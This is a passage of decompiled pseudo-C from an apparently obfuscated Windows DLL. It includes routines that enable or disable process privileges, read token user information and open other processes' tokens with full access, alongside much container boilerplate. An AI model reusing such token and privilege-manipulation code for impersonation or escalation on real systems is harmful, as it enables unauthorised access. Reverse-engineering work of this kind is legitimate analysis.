        v8 = v9[3],
        v4 = (void *)sub_10016C00(v9),
        !GetTokenInformation(v3, TokenUser, v4, v8, ReturnLength)) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  *(_BYTE *)(v9[1] + 8) = 1;
  v5 = *(void **)sub_10016C24(v9);
  pExceptionObject[0] = off_10094F7C;
  pExceptionObject[1] = v5;
  v11 = 0;
  LOBYTE(v14) = 2;
  sub_10033B9F((int)pExceptionObject, a2);
  v12 = 1;
  LOBYTE(v14) = 1;
  sub_10033B6E(pExceptionObject);
  LOBYTE(v14) = 0;
  sub_10016B53(v9);
  return a2;
}
// 10094F7C: using guessed type int (__thiscall *off_10094F7C[2])(void *Block, char);

//----- (10024E14) --------------------------------------------------------
int *__cdecl sub_10024E14(int *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  wchar_t *v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  _DWORD *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  bool v9; // bl
  int v10; // eax
  _DWORD *v11; // eax
  int v13[5]; // [esp+10h] [ebp-88h] BYREF
  int v14[4]; // [esp+24h] [ebp-74h] BYREF
  int v15; // [esp+34h] [ebp-64h]
  HLOCAL v16[3]; // [esp+38h] [ebp-60h] BYREF
  int v17[3]; // [esp+44h] [ebp-54h] BYREF
  int v18[3]; // [esp+50h] [ebp-48h] BYREF
  int v19[2]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v20[2]; // [esp+64h] [ebp-34h] BYREF
  int v21[2]; // [esp+6Ch] [ebp-2Ch] BYREF
  int v22[2]; // [esp+74h] [ebp-24h] BYREF
  int v23[2]; // [esp+7Ch] [ebp-1Ch] BYREF
  int v24; // [esp+84h] [ebp-14h]
  int v25; // [esp+94h] [ebp-4h]

  sub_10019C82(a1);
  v24 = 1;
  sub_10008683();
  v1 = operator new(8u);
  v23[1] = (int)v1;
  v25 = 1;
  if ( v1 )
    v2 = sub_1002F607((void *)0xF003F, v1);
  else
    v2 = 0;
  LOBYTE(v25) = 0;
  sub_1001D24F((_DWORD *)dword_100BBCF8, (int)v2);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B70E0);
  sub_1000CC20(v23, v3);
  v25 = 2;
  sub_1001D076(v18, (int)v23);
  LOBYTE(v25) = 4;
  sub_1000CE59(v23);
  sub_100311E9((int)v18, v14);
  LOBYTE(v25) = 5;
  while ( 1 )
  {
    v4 = sub_10031224((int)v18, v13);
    LOBYTE(v25) = 6;
    v5 = !sub_100311C2((int)v4, (int)v14);
    LOBYTE(v25) = 5;
    sub_100310DD(v13);
    if ( !v5 )
      break;
    sub_1003117B(v14, v17);
    LOBYTE(v25) = 7;
    v6 = sub_10030CA1(v17, v20);
    LOBYTE(v25) = 8;
    sub_10012A7C(v23, (int)v6);
    LOBYTE(v25) = 10;
    sub_1000CE59(v20);
    v7 = (wchar_t *)sub_1000E943((int)&unk_100B7110);
    sub_1000CC20(v21, v7);
    LOBYTE(v25) = 11;
    v24 |= 2u;
    v9 = 0;
    if ( !sub_1000D84E((int)v21, (int)v23) )
    {
      v8 = (wchar_t *)sub_1000E943((int)&unk_100B7148);
      sub_1000CC20(v22, v8);
      v25 = 12;
      v24 |= 4u;
      if ( sub_1000D8AA((int)v22, (int)v23, 0) == -1 )
        v9 = 1;
    }
    v25 = 11;
    if ( (v24 & 4) != 0 )
    {
      v24 &= ~4u;
      sub_1000CE59(v22);
    }
    v25 = 10;
    if ( (v24 & 2) != 0 )
    {
      v24 &= ~2u;
      sub_1000CE59(v21);
    }
    if ( v9 )
    {
      LOBYTE(v25) = 13;
      v10 = sub_10033B19((int)v23, (int)v16);
      LOBYTE(v25) = 14;
      v11 = sub_10033B9F(v10, v19);
      LOBYTE(v25) = 15;
      sub_10002DD6(a1, (int)v11);
      LOBYTE(v25) = 14;
      sub_1000CE59(v19);
      LOBYTE(v25) = 13;
      sub_10033B6E(v16);
      v25 = 10;
    }
    LOBYTE(v25) = 7;
    sub_10012AAC(v23);
    LOBYTE(v25) = 5;
    sub_1003078F(v17);
    ++v15;
  }
  LOBYTE(v25) = 4;
  sub_100310DD(v14);
  LOBYTE(v25) = 0;
  sub_1003078F(v18);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10024E14: using guessed type int var_48[3];
// 10024E14: using guessed type int var_74[4];
// 10024E14: using guessed type int var_88[5];
// 10024E14: using guessed type int var_54[3];
// 10024E14: using guessed type HLOCAL var_60[3];

//----- (10025061) --------------------------------------------------------
int *__cdecl sub_10025061(int *a1)
{
  unsigned int i; // edi
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  int v5; // eax
  unsigned int j; // esi
  DWORD v7; // ebx
  _DWORD *v8; // eax
  int v9; // eax
  int v11[3]; // [esp+10h] [ebp-4Ch] BYREF
  unsigned int v12; // [esp+1Ch] [ebp-40h]
  int v13[3]; // [esp+20h] [ebp-3Ch] BYREF
  unsigned int v14; // [esp+2Ch] [ebp-30h]
  int v15; // [esp+30h] [ebp-2Ch] BYREF
  int v16[2]; // [esp+34h] [ebp-28h] BYREF
  int v17; // [esp+3Ch] [ebp-20h] BYREF
  int v18[3]; // [esp+40h] [ebp-1Ch] BYREF
  bool v19; // [esp+4Fh] [ebp-Dh]
  int v20; // [esp+58h] [ebp-4h]

  sub_10025B60(a1);
  v20 = 0;
  v18[2] = 1;
  sub_1000EF17(v11);
  v20 = 1;
  sub_1001D82E(v13);
  LOBYTE(v20) = 2;
  for ( i = 0; i < v14; ++i )
  {
    v2 = (*(int (__thiscall **)(int *, unsigned int))(v13[0] + 44))(v13, i);
    v3 = sub_1001D7F9(v2, v16);
    LOBYTE(v20) = 3;
    v4 = sub_10012A7C(v18, (int)v3);
    LOBYTE(v20) = 4;
    v19 = sub_1000D8AA((int)&unk_100BF794, (int)v4, 0) != -1;
    LOBYTE(v20) = 3;
    sub_10012AAC(v18);
    LOBYTE(v20) = 2;
    sub_1000CE59(v16);
    if ( v19 )
    {
      v5 = (*(int (__thiscall **)(int *, unsigned int))(v13[0] + 44))(v13, i);
      sub_1000A289(v11, v5);
    }
  }
  for ( j = 0; j < v12; ++j )
  {
    v7 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v11[0] + 44))(v11, j);
    v8 = sub_10022A56(v7, &v17, 0x400u);
    LOBYTE(v20) = 5;
    v9 = (*(int (__thiscall **)(_DWORD *, int *, int))(*v8 + 32))(v8, &v15, 983551);
    LOBYTE(v20) = 6;
    sub_10025CC4(a1, v9);
    LOBYTE(v20) = 5;
    sub_10024B5F(&v15);
    LOBYTE(v20) = 2;
    sub_10001FCC(&v17);
  }
  LOBYTE(v20) = 1;
  sub_10009F6C(v13);
  LOBYTE(v20) = 0;
  sub_10009F6C(v11);
  return a1;
}

//----- (1002519E) --------------------------------------------------------
DWORD __thiscall sub_1002519E(void *this, int a2)
{
  return sub_100251C2(1, (int)this, a2);
}

//----- (100251B0) --------------------------------------------------------
DWORD __thiscall sub_100251B0(void *this, int a2)
{
  return sub_100251C2(0, (int)this, a2);
}

//----- (100251C2) --------------------------------------------------------
DWORD __userpurge sub_100251C2@<eax>(char a1@<al>, int a2, int a3)
{
  DWORD result; // eax
  void *v5; // [esp-18h] [ebp-48h]
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-24h] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-14h] BYREF
  struct _LUID Luid; // [esp+28h] [ebp-8h] BYREF

  Luid.LowPart = 0;
  Luid.HighPart = 0;
  memset(&NewState, 0, sizeof(NewState));
  if ( !LookupPrivilegeValueW(0, *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12), &Luid)
    || (NewState.Privileges[0].Luid = Luid,
        v5 = *(void **)(a2 + 8),
        NewState.PrivilegeCount = 1,
        NewState.Privileges[0].Attributes = a1 != 0 ? 2 : 0,
        !AdjustTokenPrivileges(v5, 0, &NewState, 0x10u, 0, 0))
    || (result = GetLastError()) != 0 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 100251C2: using guessed type _DWORD pExceptionObject[3];

//----- (1002525C) --------------------------------------------------------
_DWORD *__thiscall sub_1002525C(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100257E2(this, v3, 0);
  else
    v4 = 0;
  sub_100260EA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100252AF) --------------------------------------------------------
_DWORD *__thiscall sub_100252AF(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1002594C(this, v3, 0);
  else
    v4 = 0;
  sub_1002616E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10025302) --------------------------------------------------------
_DWORD *__thiscall sub_10025302(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100257E2(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100260EA(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002535D) --------------------------------------------------------
_DWORD *__thiscall sub_1002535D(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1002594C(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_1002616E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100253B8) --------------------------------------------------------
_DWORD *__thiscall sub_100253B8(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100257E2(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100260EA(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002542D) --------------------------------------------------------
_DWORD *__thiscall sub_1002542D(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1002594C(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_1002616E(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100254A2) --------------------------------------------------------
void __thiscall sub_100254A2(_DWORD *this)
{
  *this = &off_10094844;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094844: using guessed type int (__thiscall *off_10094844)(void *Block, char);

//----- (100254C7) --------------------------------------------------------
int *__thiscall sub_100254C7(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1002576D(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002551D: variable 'v5' is possibly undefined

//----- (1002552F) --------------------------------------------------------
int *__thiscall sub_1002552F(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100257B1(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10025585: variable 'v5' is possibly undefined

//----- (10025597) --------------------------------------------------------
void __thiscall sub_10025597(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10026129(v2);
}

//----- (100255CF) --------------------------------------------------------
void __thiscall sub_100255CF(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10026129(v3);
}

//----- (1002560A) --------------------------------------------------------
void __thiscall sub_1002560A(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10026129(v2);
}

//----- (10025642) --------------------------------------------------------
int __thiscall sub_10025642(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100261AD(v4);
  return v2;
}

//----- (1002567E) --------------------------------------------------------
int __thiscall sub_1002567E(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10026129(v4);
  return v2;
}

//----- (100256BA) --------------------------------------------------------
void __thiscall sub_100256BA(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10026129(v1);
}

//----- (10025709) --------------------------------------------------------
_DWORD *__thiscall sub_10025709(_DWORD *Block, char a2)
{
  sub_100254A2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025728) --------------------------------------------------------
_DWORD *__thiscall sub_10025728(_DWORD *Block, char a2)
{
  *Block = &off_1009487C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009487C: using guessed type int (__thiscall *off_1009487C)(void *Block, char);

//----- (10025748) --------------------------------------------------------
_DWORD *__thiscall sub_10025748(_DWORD *Block, char a2)
{
  *Block = &off_1009489C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009489C: using guessed type int (__thiscall *off_1009489C)(void *Block, char);

//----- (1002576D) --------------------------------------------------------
int __usercall sub_1002576D@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100257B1) --------------------------------------------------------
int __usercall sub_100257B1@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100257E2) --------------------------------------------------------
_DWORD *__thiscall sub_100257E2(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009487C;
  a2[1] = this;
  *a2 = &off_100948BC;
  a2[2] = a3;
  return result;
}
// 1009487C: using guessed type int (__thiscall *off_1009487C)(void *Block, char);
// 100948BC: using guessed type int (__thiscall *off_100948BC)(void *Block, char);

//----- (10025816) --------------------------------------------------------
void __thiscall sub_10025816(_DWORD *this)
{
  *this = &off_100948BC;
  *this = &off_1009487C;
}
// 1009487C: using guessed type int (__thiscall *off_1009487C)(void *Block, char);
// 100948BC: using guessed type int (__thiscall *off_100948BC)(void *Block, char);

//----- (1002583B) --------------------------------------------------------
bool __thiscall sub_1002583B(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10025852) --------------------------------------------------------
BOOL __thiscall sub_10025852(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002585C) --------------------------------------------------------
int __thiscall sub_1002585C(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10025897) --------------------------------------------------------
int __thiscall sub_10025897(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (100258CD) --------------------------------------------------------
int __thiscall sub_100258CD(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100258F5) --------------------------------------------------------
int __thiscall sub_100258F5(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10025930) --------------------------------------------------------
int __thiscall sub_10025930(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (1002594C) --------------------------------------------------------
_DWORD *__thiscall sub_1002594C(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_1009489C;
  a2[1] = this;
  *a2 = &off_100948DC;
  a2[2] = a3;
  return result;
}
// 1009489C: using guessed type int (__thiscall *off_1009489C)(void *Block, char);
// 100948DC: using guessed type int (__thiscall *off_100948DC)(void *Block, char);

//----- (10025980) --------------------------------------------------------
void __thiscall sub_10025980(_DWORD *this)
{
  *this = &off_100948DC;
  *this = &off_1009489C;
}
// 1009489C: using guessed type int (__thiscall *off_1009489C)(void *Block, char);
// 100948DC: using guessed type int (__thiscall *off_100948DC)(void *Block, char);

//----- (100259A5) --------------------------------------------------------
bool __thiscall sub_100259A5(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100259BC) --------------------------------------------------------
BOOL __thiscall sub_100259BC(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100259C6) --------------------------------------------------------
int __thiscall sub_100259C6(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (10025A01) --------------------------------------------------------
int __thiscall sub_10025A01(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10025A37) --------------------------------------------------------
int __thiscall sub_10025A37(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (10025A5F) --------------------------------------------------------
int __thiscall sub_10025A5F(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (10025A9A) --------------------------------------------------------
int __thiscall sub_10025A9A(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10025AB6) --------------------------------------------------------
_DWORD *__thiscall sub_10025AB6(_DWORD *Block, char a2)
{
  sub_10025816(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025AD5) --------------------------------------------------------
_DWORD *__thiscall sub_10025AD5(_DWORD *Block, char a2)
{
  sub_10025980(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025B12) --------------------------------------------------------
_DWORD *__userpurge sub_10025B12@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  void *v5; // [esp-4h] [ebp-20h]

  sub_10026247(a2);
  *a2 = &off_100947E8;
  a2[2] = 1;
  v5 = (void *)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10025F1B(a2, v2, v4, v5);
  return a2;
}
// 100947E8: using guessed type int (__thiscall *off_100947E8)(void *Block, char);

//----- (10025B60) --------------------------------------------------------
_DWORD *__stdcall sub_10025B60(_DWORD *a1)
{
  sub_10026247(a1);
  *a1 = &off_100947E8;
  sub_10026272(a1);
  return a1;
}
// 100947E8: using guessed type int (__thiscall *off_100947E8)(void *Block, char);

//----- (10025B92) --------------------------------------------------------
int *__thiscall sub_10025B92(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10025BE9) --------------------------------------------------------
void __thiscall sub_10025BE9(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx

  *this = &off_100947E8;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  sub_100254A2(this);
}
// 100947E8: using guessed type int (__thiscall *off_100947E8)(void *Block, char);

//----- (10025C4C) --------------------------------------------------------
int __thiscall sub_10025C4C(_DWORD *this)
{
  return this[1];
}

//----- (10025C50) --------------------------------------------------------
int __thiscall sub_10025C50(_DWORD *this, int a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // edi
  int result; // eax
  int v10; // [esp+18h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_100B6BFE);
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 12 * v7;
    v10 = v7 - a3;
    do
    {
      sub_10024D28(this[3] + v8 - 12, this[3] + v8);
      v8 -= 12;
      --v10;
    }
    while ( v10 );
  }
  result = sub_10024D28(a2, this[3] + 12 * a3);
  ++this[1];
  return result;
}

//----- (10025CC4) --------------------------------------------------------
int __thiscall sub_10025CC4(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 4))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 32))(this, a2, v4);
}

//----- (10025CDF) --------------------------------------------------------
int __thiscall sub_10025CDF(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

